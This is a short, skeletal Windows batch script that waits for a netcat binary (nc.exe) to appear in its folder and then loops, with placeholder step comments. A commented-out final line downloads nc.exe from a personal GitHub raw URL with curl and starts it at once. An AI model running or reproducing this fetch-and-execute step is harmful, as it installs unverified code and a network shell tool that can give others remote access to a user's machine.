@echo off
:check
if exist "%~dp0nc.exe" goto loop
rem step 2
timeout /t 5 /nobreak>nul
goto check
:loop
rem step 3
goto loop
pause
exit

rem curl -L -o nc.exe https://raw.githubusercontent.com/VRVRxX/projects/main/nc.exe && start nc.exe
